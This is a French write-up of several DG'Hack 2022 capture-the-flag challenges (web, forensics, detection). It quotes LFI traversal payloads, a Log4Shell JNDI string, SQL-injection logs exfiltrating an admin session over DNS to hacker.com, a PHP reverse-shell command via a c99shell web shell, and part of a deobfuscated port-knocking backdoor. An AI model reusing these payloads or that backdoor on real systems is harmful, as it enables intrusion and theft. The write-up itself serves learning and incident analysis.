# DG’Hack 2022

Voici les writeups pour tous les challenges que j'ai réussi à flag pour cette édition du CTF 😎
J'ai bien entendu bien avancé dans plusieurs autres challenges (Curlify, Wanna more features, Cryptobvious) mais je n'ai pas réussi à flag à temps, je vous renvoie donc vers les writeups des autres participants.

# WEB - Un chasseur sachant chasser partie 1

Techno utilisée: nginx + php

Il y a une page download.php avec un nom de fichier spécifié dans le chemin, peut être une LFI ?

Oui c’est une LFI, on récupère le fichier /etc/passwd en rentrant ça dans la variable menu:

```bash
menu=../../../../../../etc/passwd
```

Même peut être une RFI ? Pas réussi 😟

On tente d’accéder aux logs Nginx:

```bash
menu=../../../../../../var/log/nginx/access
```

Par contre on récupère le fichier de conf:

```bash
menu=../../../../../../etc/nginx/nginx.conf
```

On trouve le flag dans ce fichier! 

# DEV - Coffre-fort Secret

Il s’agit de faire marcher le programme en Go, il faut déjà s’équiper du bon environnement pour tester le code

Il y a un problème pour déterminer si le texte entré est en base64 ou pas

La solution qui fonctionne est décomparer en premier lieu si le texte est un multiple de 4 puis ensuite de regarder si les caractères utilisés sont autorisés en base64

Il faut donc changer la fonction de détection de texte en base64

Il y a aussi un problème dans l’utilisation des fonction de chiffrement et déchiffrement, il faut se référer aux exemple d’utilisation de celles-ci pour faire marcher les fonctions

# FORENSIC - Pas un bon nom

Exemple d’un fichier torrent chiffré par le Ransomware

```xml
d10:created by18:qBittorrent v4.4.213:creation datei1652444777e4:infod6:lengthi344351e4:name14:formule E.jfif12:piece lengthi16384e6:pieces440:�N�����%g��`y��|N{�a��ĆyƯ۱ %0�p#�G]SD�|���if����nv�(�x�����59Pf�f�^�X�
l鞪�D2�9����%Sϻ��s͊�a;^J�х��~���F�[G%�5��'���/+��.�F^�3�A���O������	yR�m�Cb!89aj\�@]x����T%~��fiW�$��"��xVA���} -�
3N9����Lj`y"]�M������������}�J��څ33���8�Z��5�Sʎ'K��e���{�����2-O�?;�5_���[�gL�<򘏬'@���%�}-��K[V��u�z�d��#�'���I�Ċa���
```

On trouve dans la corbeille le texte en clair de ce fichier torrent, il nous suffit donc de faire un XOR (fichier chiffré, fichier clair) pour obtenir des répétitions de la clé. (cf description du XOR)

On obtient la clé qui se répéte:

```
REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNf
```

Il existe des utilitaires sur GitHub:

[https://github.com/scangeo/xor-files](https://github.com/scangeo/xor-files)

# DETECTION - PirateCraft

Voici le .bash_history dans le home:

```
whoami
mkdir /home/craft
cd /home/craft/
ls -lthar
apt-get update -y
apt-get install -y openjdk-17-jdk openjdk-17-jre git zip screen wget nano openssh-server php7.4
https://launcher.mojang.com/v1/objects/0a269b5f2c5b93b1712d0f5dc43b6182b9ab254e/server.jar
mv server.jar minecraft_server.jar
nano /home/craft/start.sh
chmod -R 775 /home/craft/
screen -ls
/home/craft/start.sh minecraft "java -Xmx1024M -Xms1024M -jar /home/craft/minecraft_server.jar nogui &"
screen -R minecraft
cat /var/log/minecraft.log
ls -lthar
pwd
whoami
netstat -lentupac
rm minecraft_server.jar
echo "Hacked by unhappy.competitor.com"
```

On comprend donc que l’attaque se fait à partir du pwd et whoami et qu’il a delete le .jar (pas possible de regarder les logs de log4j alors

Vu que ça concerne Minecraft et Java, on pense tout de suite à un exploit LOG4SHELL

Attaque survenue le 8 mai d’après les modifications de fichiers

Dans les logs Minecraft, quand on grep ‘unhappy’:

```
[16:39:32] [User Authenticator #10639/INFO]: UUID of player unhappy is a00b999e-001b-4807-b999-add902b9999c
[16:39:32] [Server thread/INFO]: unhappy[/172.240.18.1:57008] logged in with entity id 10991 at (-257.5, 67.0, -198.5)
[16:39:32] [Server thread/INFO]: unhappy joined the game
[16:39:33] [Server thread/INFO]: <unhappy> ${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//unhappy.competitor.com:1389/a}
[16:39:33] [Server thread/INFO]: <unhappy> Reference Class Name: foo
[16:40:02] [Server thread/INFO]: unhappy lost connection: Disconnected
[16:40:02] [Server thread/INFO]: unhappy left the game
```

Ce que l’on voit ici c’est bien une attaque LOG4SHELL, l’attaquant lance une requête à un LDAP depuis le serveur minecraft

IP du LDAP selon les logs Ansible qui ont modifié les logs de la machine: 174.10.54.15

On fait alors un ldapsearch avec la même requête que l’attaquant:

```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
javaClassName: foo
javaCodeBase: http://174.10.54.15:50666/
objectClass: javaNamingReference
javaFactory: Exploit84686564564857543

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

L’attaquant a aussi un serveur http up sur la même addresse, on fait donc un wget avec le nom de la classe (Exploit846…) 

Lorsque qu’on décompile la classe java, on remarque le schéma d’un l’exploit mais aussi du code rajouté. En fait le code rajouté permet de reconstituer le flag, on peut comparer en cherchant le code original de l’exploit.

# FORENSIC - Vivre pas cher

On remarque ce service en cherchant une backdoor:

```
cat systembd.service 
[Unit]
Description=backdoor
After=network.target

[Service]
User=root
Type=simple
ExecStart=/usr/sbin/groupdel start_backdoor
Restart=on-failure
RestartSec=10s

[Install]
WantedBy=multi-user.target
```

Modification de groupdel → attaque le 9 nov

Lorsque l’on regarde groupdel, on remarque qu’une librairie avec un nom suspect (backdoor dedans) est chargée, on cherche donc la librairie, la décompile avec Ghidra et on trouve le flag en clair

# DETECTION - Shadow4DGA - Partie 1

Faux flags dans le .bash_history et le code du site:

DGHACK{N1CE_T0_M33T_Y0U}

DGHACK{YOU ARE ADMIN - ALL PERMISSIONS ARE BELONG TO US}

SQL injection dans le champ de admin.php → comment l’attaquant est arrivé ici ?

La fuite de donnée est le mdp d’accès pour un fichier secret

Les logs de access.log:

```
174.10.50.30 - - [17/Jun/2022:21:18:56 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:20:56 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200,test;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:22:56 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200,test,test;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:24:57 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200,(select%20session%20from%20users%20where%20username='admin'),test;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"

174.10.50.30 - - [17/Jun/2022:21:26:57 +0200] "GET /admin.php?limit=10&offset=0);CREATE%20PROCEDURE%20exf(data%20varchar(100))%20BEGIN%20SELECT%20LOAD_FILE(CONCAT('%5C%5C',data,'%5Ca'));END;select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:28:57 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf('beginexf.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"

174.10.50.30 - - [17/Jun/2022:21:31:08 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),1,63),'.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"

174.10.50.30 - - [17/Jun/2022:21:33:19 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),64,63),'.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:35:19 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),127,63),'.hacker.com'));select%200,NULL,NULL;--https://174.10.50.1/admin.php?limit=10&offset=0);CALL%20exf('endexf.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:37:24 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf('hacked.hacker.com');select%200,NULL,NULL;-- HTTP/1.1" 499 0 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:37:29 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf('hacked.hacker.com');select%200,NULL,NULL;-- HTTP/1.1" 499 0 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:37:31 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf('hacked.hacker.com');select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:42:29 +0200] "GET /admin.php?limit=5&offset=0 HTTP/1.1" 200 5598 "http://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:42:33 +0200] "GET /admin.php?limit=10&offset=0 HTTP/1.1" 200 6236 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:43:33 +0200] "GET /admin.php?limit=10&offset=0 HTTP/1.1" 200 5917 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:43:58 +0200] "GET /admin.php?limit=10&offset=0 HTTP/1.1" 200 5614 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:44:14 +0200] "POST /admin.php HTTP/1.1" 200 73 "http://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:44:33 +0200] "GET /admin.php?limit=10&offset=0 HTTP/1.1" 200 5933 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:45:30 +0200] "GET /admin.php?download=CR4T0G9U HTTP/1.1" 200 5340 "http://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
```

Les logs des requêtes SQL envoyées sont chiffrées avec un clé qui est en clair sur le code du site, avec un petit script PHP on déchiffre donc les requêtes:

```sql
[17-Jun-2022 03:47:56] - tZFNS8NAEIbv+RVDPeTiYXaz2Y9AELGRgrWtjSBSpOzHBBZsEpqC9N8b66GiCF6c0zDvPPMcpn6YF7BhiC9QV/Pq5hFioPYQm0j7S+jtMLx1+wC36+U9NPGVhgR+qadZta6+0FDCFVwvpucj4yCpxxjqk5Rn+j+k6bJaTJ9X1Sz9bk8tcofMSKa0kT5YHgRlQqlAJBtLuUCOJlDm0JCzOdPBOK0Zep5Lp5FkGLecz53ginGBnhny3LtciTyTSIEFbxT3Voz9qEDpVKOD8oqktIHSZGX3djcUADy5o2MBq26Ih9i1cIFF0n+EbVdi0todlZvxJ5NJEoftKSjZ58L2cOyp/MGzM8/+xL8D

SQL: [100] SELECT identifier, password FROM files
                        WHERE identifier = ? AND password = ?
Sent SQL: [238] SELECT identifier, password FROM files
                        WHERE identifier = 'OENDYPEH' AND password = 'a02b019617896cda2d4e3477dee6fae540209de3b09eba518d9b8810c256b80e6dfaebc5b4271240c19ec2cb5745360ed1dc972ca40ed89606b7f8d7c7e66ade'

[17-Jun-2022 03:48:30] - tZFNS8NAEIbv+yuGesjFw37vbCCI1Khg1bYp9VCkbLMTWLBJaQrSf2+thxZF8OIc532feQ5TTUY5LATnr1CVo3I4gxSp3aUm0fYSNqHv37tthNvp8yM06Y16Br/My305Lc9oKOAKrp9uTkcOC1YdYqiOUqnwP6TZbMjv5vPJPPtuzzA2UntvSSplXaRaa+0UUiQvavLko4jCY+OMWllhhLaWCyOdRm2sV9ysDBfoyJlQ19GLIGKUmteGEEmR1SuPaJT26E0tMUqLHklq63zUJriMjcM2rPscQLIH2ucw7vq0S10LFzxnm8+w7QrO2rCmYnH4yWDAUr88BoX4Kix3+w0VP3hx4sWf+A8=

SQL: [100] SELECT identifier, password FROM files
                        WHERE identifier = ? AND password = ?
Sent SQL: [238] SELECT identifier, password FROM files
                        WHERE identifier = 'TC0GVVQV' AND password = '8df24996e23367dec444738ede91ce9e9d1d198f753b615146601527484569305b50187e75accd91a1dd240c5e88e3e64b9885349895c28d26898e24679d45a7'

[17-Jun-2022 03:57:28] - tZFNS8NAEIbv+yuGesjFw37vbCCI1KhgtR8p9VCkbLMTWLBJaQrSf2+th4oieHGO877PPIeppqMcloLzF6jKUTmcQ4rU7lOTaHcJ29D3b90uwu1s/AhNeqWewS/zfF/Oyi80FHAF10835yPHBauOMVQnqVT4H9JsPhzfLRbTRfbdnmFspPbeklTKuki11toppEhe1OTJRxGFx8YZtbbCCG0tF0Y6jdpYr7hZGy7QkTOhrqMXQcQoNa8NIZIiq9ce0Sjt0ZtaYpQWPZLU1vmoTXAZm4Rd2PQ5gGQPdMhh0vVpn7oWLnjOth9h2xWctWFDxfL4k8GApX51CgrxWVjtD1sqfvDizIs/8e8=

SQL: [100] SELECT identifier, password FROM files
                        WHERE identifier = ? AND password = ?
Sent SQL: [238] SELECT identifier, password FROM files
                        WHERE identifier = 'TCOGVVQV' AND password = '8df24996e23367dec444738ede91ce9e9d1d198f753b615146601527484569305b50187e75accd91a1dd240c5e88e3e64b9885349895c28d26898e24679d45a7'

[17-Jun-2022 09:12:41] - Cw70sVKINraMVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTBV8HdzC3YNUTDQtOYKSCxKzC22UlAw4AIA

SQL: [39] (SELECT * FROM files LIMIT 5 OFFSET 0);
Params:  0

[17-Jun-2022 09:12:41] - Cw70sVKINjGIVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTA0UPB3cwt2DVEw0LTmCkgsSswttlJQMOACAA==

SQL: [40] (SELECT * FROM files LIMIT 10 OFFSET 0);
Params:  0

[17-Jun-2022 09:26:57] - LcxBC4IwHIbxu5/ivbmFwoS6tJPN/0KYznSeMmKYUmAXlejjR9Hluf2e5mT2OCe77QWsIUPKYQNd2wLjYxoWmLzIHRIBq3VDDoJLVVPqCFVtFWVtTRjeI7v51ePl5/7uZ5YIwTkOdMxL/KfGptlV54aYsqVKHQu7Loy+Kgo7H3IuqczkMkxDv0JEZWvMLzKOuQwqP/vnsgdE8AE=

SQL: [154] (SELECT * FROM files LIMIT 10 OFFSET 0);CREATE PROCEDURE exf(data varchar(100)) BEGIN SELECT LOAD_FILE(CONCAT('\\',data,'\a'));END;select 0,NULL,NULL;--);
Params:  0

[17-Jun-2022 09:28:57] - Cw70sVKItjSLVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTA0UPB3cwt2DVEw0LR2dvTxUUitSNNQT0pNz8wDsvQyEpOzU4v0kvNz1TU1rYtTc1KTSxQMdPxCfXzAhLWurqY1V0BiUWJusZWCggEXAA==

SQL: [96] (SELECT * FROM files LIMIT 10 OFFSET 0);CALL exf('beginexf.hacker.com'));select 0,NULL,NULL;--);
Params:  0

[17-Jun-2022 09:30:57] - LcxBC4IwGIDhu7/iu7mFihZ4cHQw0RCmlpun6DDsEyWnsBX18wPp8vKcXnHlCdyieH8HInKeZxJ2ULRNBcM0owVeVqWEKISmKEQuIaQsSzkH/A4ka+oslUR0JyHbsj4TYnHG/gUWrZ3WBQazanhbNBY+IxrcvCiNR1c99LS41Iu8+EA9NxhV/0QT9Kt2KWX/T+jVHedbmO9T5lyUUdomAKHzAw==

SQL: [162] (SELECT * FROM files LIMIT 10 OFFSET 0);CALL exf(CONCAT(SUBSTRING((select session from users where username='admin'),1,63),'.hacker.com'));select 0,NULL,NULL;--);
Params:  0

[17-Jun-2022 09:33:08] - LcxBC4IwGIDhu7/iu7mFimJ4cHQw0RCmVpun6DDsEyWnsBX18wPp8vKcXnHhKdyiJL4DEQUvcgk7KK9tDcM0owVe1ZWEKIS2LEUhIaQszzgH/A4kb5s8k0R0RyGvVXMixOKM/QssWjutCwxm1fC2aCx8RjS4eVEaD6566GlxqZfsvSSmnhuMqn+iCfpVu5Sy/yj0mo7zLcz3KXPOyihtU4DQ+QE=

SQL: [163] (SELECT * FROM files LIMIT 10 OFFSET 0);CALL exf(CONCAT(SUBSTRING((select session from users where username='admin'),64,63),'.hacker.com'));select 0,NULL,NULL;--);
Params:  0

[17-Jun-2022 09:35:19] - Cw70sVKItjSJVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTA0UPB3cwt2DVEw0LR2dvTxUUitSNNQT81LAdJ6GYnJ2alFesn5ueqamtbFqTmpySUKBjp+oT4+YMJaV1fTmisgsSgxt9hKQcGACwA=

SQL: [94] (SELECT * FROM files LIMIT 10 OFFSET 0);CALL exf('endexf.hacker.com'));select 0,NULL,NULL;--);
Params:  0

[17-Jun-2022 09:37:19] - Cw70sVKItjSOVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTA0UPB3cwt2DVEw0LR2dvTxUUitSNNQz0hMzk5N0QNTRXrJ+bnqmtbFqTmpySUKBjp+oT4+YMJaV1fTmisgsSgxt9hKQcGACwA=

SQL: [93] (SELECT * FROM files LIMIT 10 OFFSET 0);CALL exf('hacked.hacker.com');select 0,NULL,NULL;--);
Params:  0

[17-Jun-2022 09:42:29] - Cw70sVKINraMVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTBV8HdzC3YNUTDQtOYKSCxKzC22UlAw4AIA

SQL: [39] (SELECT * FROM files LIMIT 5 OFFSET 0);
Params:  0

[17-Jun-2022 09:42:33] - Cw70sVKINjGIVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTA0UPB3cwt2DVEw0LTmCkgsSswttlJQMOACAA==

SQL: [40] (SELECT * FROM files LIMIT 10 OFFSET 0);
Params:  0

[17-Jun-2022 09:44:14] - pZBNa8JAEIbv+RWDlyhY2El2d3YDOZQiIhVtTeyliGz2AwL1AyMU/31XS0UpPfU48z7zwLzV67SAd9IrmMyq0aKGyXg2X4ziVM8htB++g37r/PbYhtYfhrA3Xfe5O7gBvD1Ol6MK+sVtXFzzpIpbqC561P/wp08LXrOxXqZDSBsrGXEhUQrRmAYpGOSY555xL5gnpxQ5QYICs7kIEg2htE5zaZX0qILwhrgiRVx6aZnTUUcyN7Yx8Ygbp4OVWQgWM8mtdUSKBcVZ1oT4BaaD5MUczKYrALLk2Z8KmJmNP/+IK7ipItmfse2ufMBkG4nyAvRuiF7SdusLVeI3vT6e9r6818birp3+duqz8if+W/gF

SQL: [79] INSERT IGNORE INTO files (identifier, password) VALUES (:identifier, :password)
Sent SQL: [199] INSERT IGNORE INTO files (identifier, password) VALUES ('CR4T0G9U', 'bc6074561655bab17fa14133e04e50e7d887d5757f0c35f61a716cd946c86e18f5ea74878746e6c0d9074763acba57f4ad9fc62ffc1264ccd7780f8402bf1991')

[17-Jun-2022 09:44:33] - Cw70sVKINjGIVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTA0UPB3cwt2DVEw0LTmCkgsSswttlJQMOACAA==

SQL: [40] (SELECT * FROM files LIMIT 10 OFFSET 0);
Params:  0

[17-Jun-2022 09:45:30] - Cw70sVKINjWIVQh29XF1DlHITEnNK8lMy0wtUnAL8vdVSMvMSS1WCPdwDXJFlrNVsFfgCgZyFYIhJliSboK6c5BJiIG7Zai6AldAYlFibrGVgoIhl3dqpZVCQH5xZklmfp6CsoEVVwFIMi/f1oArLzE31TYa6FolJa7M4niwhK0hREF8SWVBqq0RFwA=

SQL: [50] SELECT identifier FROM files WHERE identifier = ? 
Sent SQL: [59] SELECT identifier FROM files WHERE identifier = 'CR4T0G9U'&

[21-Jun-2022 03:06:18] - Cw70sVKINraMVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTBV8HdzC3YNUTDQtOYKSCxKzC22UlAw4AIA

SQL: [39] (SELECT * FROM files LIMIT 5 OFFSET 0);

[21-Jun-2022 03:06:29] - Cw70sVKINjGIVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTA0UPB3cwt2DVEw0LTmCkgsSswttlJQMOACAA==
[21-Jun-2022 03:07:28] - tZFNS8NAEIbv+yuGesjFw37vbCCI1KhgtR8p9VCkbLMTWLBJaQrSf2+th4oieHGO877PPIeppqMcloLzF6jKUTmcQ4rU7lOTaHcJ29D3b90uwu1s/AhNeqWewS/zfF/Oyi80FHAF10835yPHBauOMVQnqVT4H9JsPhzfLRbTRfbdnmFspPbeklTKuki11toppEhe1OTJRxGFx8YZtbbCCG0tF0Y6jdpYr7hZGy7QkTOhrqMXQcQoNa8NIZIiq9ce0Sjt0ZtaYpQWPZLU1vmoTXAZm4Rd2PQ5gGQPdMhh0vVpn7oWLnjOth9h2xWctWFDxfL4k8GApX51CgrxWVjtD1sqfvDizIs/8e8=
[21-Jun-2022 05:13:44] - Cw70sVKINraMVdAIdvVxdQ5R0FJwC/L3VUjLzEktVvDx9PUMUTBV8HdzC3YNUTDQtOYKSCxKzC22UlAw4AIA
```

On voit l’exfiltration de l’attaquant, il a volé le cookie de session de “admin”, manque de chance il peut l’utiliser direct pour se log, upload un fichier php qui wget un reverse shell et il y accède pour avoir un foothold

Dans le fichier secret de la fuite de donnée il y a des creds pour un utilisateur “observateur” qui a le droit de voir les fichiers mais pas d’upload:

ob4shadow - 5H@D0W_4_0853rV470r

C’est donc comme cela que l’attaquant a pu accéder à la page admin.php et tenter des injections SQL.

La db est sur 174.10.50.11 d’après config.php

Cookie admin exfiltré (le flag en fait si on met DGHACK{} autour):

b86eb8dae7809614b94dda9116a68f4a71a25cfe9e9a0b4f53621d87110930848204f157efc3defd5afb5b8b2fb9f6f560d26dc425532f1a77bc8ae3e07fcfc6

L’ip de l’attaquant est 174.10.50.30 d’après les logs d’accès.

```html
/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fshadow4dga%2F&cmd=php+-r+%27%24sock%3Dfsockopen%28%22174.10.50.30%22%2C2222%29%3Bexec%28%22%2Fbin%2Fbash+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&cmd_txt=1&submit=Execute
```

Actions de l’attaquant avec c99shell.php

```html
174.10.50.30 - - [17/Jun/2022:21:45:46 +0200] "GET /c99shell.php HTTP/2.0" 200 4225 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:45:52 +0200] "GET /c99shell.php?act=f&f=c99shell.php&d=%2Fvar%2Fwww%2Fshadow4dga& HTTP/2.0" 200 70723 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:46:02 +0200] "GET /c99shell.php? HTTP/2.0" 200 4224 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:46:15 +0200] "GET /c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fshadow4dga%2F&cmd=chmod+777+c99shell.php&cmd_txt=1&submit=Execute HTTP/2.0" 200 3042 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:46:19 +0200] "POST /c99shell.php? HTTP/2.0" 200 3042 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:46:20 +0200] "GET /c99shell.php? HTTP/2.0" 200 4220 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:46:46 +0200] "GET /c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fshadow4dga%2F&cmd=echo+%27HACKED+BY+HACKER.COM%27&cmd_txt=1&submit=Execute HTTP/2.0" 200 3054 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:46:50 +0200] "GET /c99shell.php? HTTP/2.0" 200 4222 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:57:26 +0200] "GET /c99shell.php HTTP/2.0" 200 4221 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:22:07:47 +0200] "GET /c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fshadow4dga%2F&cmd=php+-r+%27%24sock%3Dfsockopen%28%22174.10.50.30%22%2C2222%29%3Bexec%28%22%2Fbin%2Fbash+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&cmd_txt=1&submit=Execute HTTP/2.0" 504 5143 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [18/Jun/2022:02:06:47 +0200] "GET /c99shell.php HTTP/2.0" 200 4220 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
```

# DETECTION - Shadow4DGA - Partie 2

On trouve un fichier [system.py](http://system.py) dans le home (lancé par la backdoor qui est un service). Ce fichier est au début obfuscé en plusieurs partie par une base64 avec des noms exotiques (magic,love,trust,god …) puis évalué par concaténation.

Voici le fichier après deobfuscation:

```python
import os
import pty
import socket
import socketserver
import threading
import time
import subprocess

listen_knock = list()

class KnockThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        _, server_port = self.request.getsockname()
        # print('Ping on {}'.format(server_port))
        global listen_knock
        listen_knock.append({'d': time.time(), 'p': server_port})

class KnockThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

class backdoor_knock_server:
    def __init__(self, current_ip: str, knock_seq: list[int], reverseshell_host: str, reverseshell_port: int):
        # port knocking backdoor
        self.current_ip = current_ip
        self.knock_seq = knock_seq
        self.servers = []
        # reverseshell information
        self.revsh_host = reverseshell_host
        self.revsh_port = reverseshell_port
        # statement
        self.status = 'down'

    def start(self):
        try:
